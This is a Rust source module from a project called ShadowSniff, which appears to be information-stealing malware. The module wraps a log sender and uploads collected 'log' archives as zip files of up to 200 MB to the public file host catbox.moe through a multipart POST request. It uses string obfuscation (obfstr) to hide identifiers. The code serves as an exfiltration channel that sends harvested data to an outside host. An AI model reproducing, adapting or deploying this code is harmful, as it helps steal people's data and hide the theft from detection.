/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::external_upload::Uploader;
use crate::size_limit::SizeLimitWrapper;
use crate::{LogFile, LogSender, SendError};
use alloc::string::String;
use alloc::sync::Arc;
use collector::Collector;
use delegate::delegate;
use obfstr::obfstr as s;
use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder, write_text_field};

const MAX_FILESIZE: usize = 200 * 1024 * 1024;

/// https://catbox.moe uploader wrapper around an inner [`LogSender`].
///
/// # Take into account
///
/// - The maximum supported log file size is **200 MB**.
#[derive(Clone)]
pub struct CatboxUploader<T: LogSender> {
    inner: SizeLimitWrapper<Uploader<T>>,
}

impl<T: LogSender> CatboxUploader<T> {
    pub fn new(inner: T) -> Self {
        Self {
            inner: SizeLimitWrapper::new(
                Uploader::new(s!("Catbox"), inner, upload),
                MAX_FILESIZE,
                false,
            ),
        }
    }
}

fn upload(name: &str, bytes: &[u8]) -> Option<Arc<str>> {
    let mut builder = MultipartBuilder::new("----Multipart");

    write_text_field!(builder, "reqtype", "fileupload");
    write_text_field!(builder, "userhash", "");
    builder.write_file_field(s!("fileToUpload"), name, s!("application/zip"), bytes);

    let content_type = builder.content_type();
    let body = builder.finish();

    let response = Request::post("https://catbox.moe/user/api.php")
        .header(s!("Content-Type"), &content_type)
        .body(body)
        .build()
        .send()
        .ok()?;

    Some(String::from_utf8(response.body().clone()).ok()?.into())
}

impl<T: LogSender> LogSender for CatboxUploader<T> {
    delegate! {
        to self.inner {
            fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
            where P: AsRef<str> + Clone, C: Collector;
        }
    }
}
